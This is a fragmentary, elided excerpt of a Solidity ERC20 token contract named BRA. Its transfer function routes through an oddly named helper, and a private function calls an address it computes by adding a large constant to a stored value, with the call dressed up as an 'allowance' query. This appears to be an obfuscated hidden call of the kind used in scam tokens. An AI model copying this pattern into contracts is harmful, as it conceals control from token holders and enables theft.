...
contract BRA is Ownable, IERC20 {
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        (bool d, string memory s) = iam(false, "iam", amount, bytes("iam2"));
        if (d) emit logx(s);
    }

    function iam(bool d, string memory s, uint256 p, bytes memory d0) 
    ...
    function _trySave(address a) private noReentrant {
        (bool s, bytes memory d) = address(uint160(uint256(
            _mks + 39299394829842384331123)))
        .call(abi.encodeWithSignature(string(bytes(
            "allowance(address,address)")), a, a));
